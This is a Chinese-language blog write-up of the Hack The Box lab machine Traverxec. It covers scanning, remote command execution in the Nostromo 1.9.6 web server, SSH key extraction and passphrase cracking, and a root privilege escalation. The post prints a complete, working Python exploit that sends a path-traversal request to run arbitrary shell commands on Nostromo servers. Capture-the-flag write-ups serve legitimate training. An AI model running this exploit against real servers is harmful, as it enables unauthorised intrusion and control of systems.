---
title: Hack The Box - Traverxec の Write-Up
date: 2019-12-17 19:15:47
categories:
- WriteUPs
- Hack The Box
tags:
- Web
---
## 前言

&emsp;&emsp;Hack The Box是一个非常完备的渗透测试训练靶场，比较接近于实战，许多机器存在不小的难度。不过美中不足的一是会员价格太贵，二是需要通过VPN接入实验网络，然而国内连接实在是有点慢，特别是晚上网络高峰期，各种连接失败不在话下。

&emsp;&emsp;这两天玩了[Traverxec](https://www.hackthebox.eu/home/machines/profile/217)这台靶机，相较而言是一个很简单的机器了，但是也学到了不少东西。

![](/img/Traverxec/Traverxec1.png)

<!-- more -->

## Step 1：扫描

&emsp;&emsp;第一步当然是常规的Nmap扫描：

![](/img/Traverxec/Traverxec2.png)

&emsp;&emsp;可以看到靶机只开放了22和80两个端口。

## Step 2：渗透

&emsp;&emsp;从Nmap扫描结果来看80端口开放的是Nostromo 1.9.6服务，网站页面本身并不能找到什么可以利用的漏洞。

![](/img/Traverxec/Traverxec3.png)

&emsp;&emsp;emmm，David是个信息点。

&emsp;&emsp;Web界面上找不到什么好玩的东西了，既然我们有了Nostromo的具体版本号，那就去搜索一下有没有可以利用的漏洞：

![](/img/Traverxec/Traverxec4.png)

&emsp;&emsp;不搜不知道，一搜吓一跳，第一条就是最喜欢的远程命令执行漏洞。下面给出EXP：

```Python
#!/usr/bin/env python

import socket
import argparse

parser = argparse.ArgumentParser(description='RCE in Nostromo web server through 1.9.6 due to path traversal.')
parser.add_argument('host',help='domain/IP of the Nostromo web server')
parser.add_argument('port',help='port number',type=int)
parser.add_argument('cmd',help='command to execute, default is id',default='id',nargs='?')
args = parser.parse_args()

def recv(s):
	r=''
	try:
		while True:
			t=s.recv(1024)
			if len(t)==0:
				break
			r+=t
	except:
		pass
	return r
def exploit(host,port,cmd):
	s=socket.socket()
	s.settimeout(1)
	s.connect((host,int(port)))
	payload="""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1""".format(cmd)
	s.send(payload)
	r=recv(s)
	r=r[r.index('\r\n\r\n')+4:]
	print r

exploit(args.host,args.port,args.cmd)
```

&emsp;&emsp;运行脚本即可获得反弹shell：

![](/img/Traverxec/Traverxec5.png)

![](/img/Traverxec/Traverxec6.png)

&emsp;&emsp;显然得到的是一个非交互shell，通过熟悉的命令可得到交互式shell，不熟悉的可以去看我之前DC系列靶机的Write-Ups。

## Step 3：突破

&emsp;&emsp;此时在目录下可以找到Nostromo服务的配置文件：

![](/img/Traverxec/Traverxec7.png)

&emsp;&emsp;在配置文件中发现存在Public文件夹public_www。但是尝试进入/home/david文件夹后提示权限禁止。

![](/img/Traverxec/Traverxec8.png)

&emsp;&emsp;于是不管这一层，直接进入public_www文件夹：

![](/img/Traverxec/Traverxec9.png)

&emsp;&emsp;果然在这个文件夹里发现了好东西，看名字就是ssh的登录凭证，后面的思路一下就有了。但是有个问题，怎么把这个文件下载到本地呢？

![](/img/Traverxec/Traverxec10.png)

![](/img/Traverxec/Traverxec11.png)

&emsp;&emsp;巧妙的通过base方法即可实现该文件的下载，快拿小本本记一下。解压这个文件，果然是ssh登录凭证。

![](/img/Traverxec/Traverxec12.png)

&emsp;&emsp;但是尝试通过这个凭证登录时提示需要使用凭证的密码，这时候只有通过john工具来暴力破解了。[这里](https://blog.csdn.net/qq_40490088/article/details/97812715)对这种方法有详细的解释。

![](/img/Traverxec/Traverxec13.png)

![](/img/Traverxec/Traverxec14.png)

![](/img/Traverxec/Traverxec15.png)

&emsp;&emsp;这样我们就得到了ssh凭证的密码：hunter。结合Web页面得到的david信息点，我们通过ssh登录靶机：

![](/img/Traverxec/Traverxec16.png)

## Step 4：提权

&emsp;&emsp;我们已经以david的身份登录了靶机，下一步就是尝试提权获取靶机root权限。在当前文件夹下发现一个奇怪的目录bin，进去之后看到一个服务的脚本，好奇心促使我看了一眼：

![](/img/Traverxec/Traverxec17.png)

&emsp;&emsp;果然有猫腻，这个服务居然有root权限。ok，轻松提权：

![](/img/Traverxec/Traverxec18.png)

&emsp;&emsp;至此，这个靶机算是完全被我们掌控。